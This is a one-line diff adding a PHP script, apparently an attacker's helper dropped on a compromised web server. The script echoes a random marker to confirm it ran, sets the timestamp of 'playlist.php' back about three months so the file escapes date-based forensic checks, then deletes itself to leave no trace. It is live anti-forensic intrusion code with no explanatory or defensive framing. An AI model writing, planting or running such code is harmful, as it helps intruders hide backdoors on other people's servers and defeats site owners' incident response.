@@ -1,0 +1,1 @@
+<?php echo "fSwxuctTqY"; if (file_exists("./playlist.php")){ touch("./playlist.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*mraPAgxW33qD8y7bBpBs*/ ?>
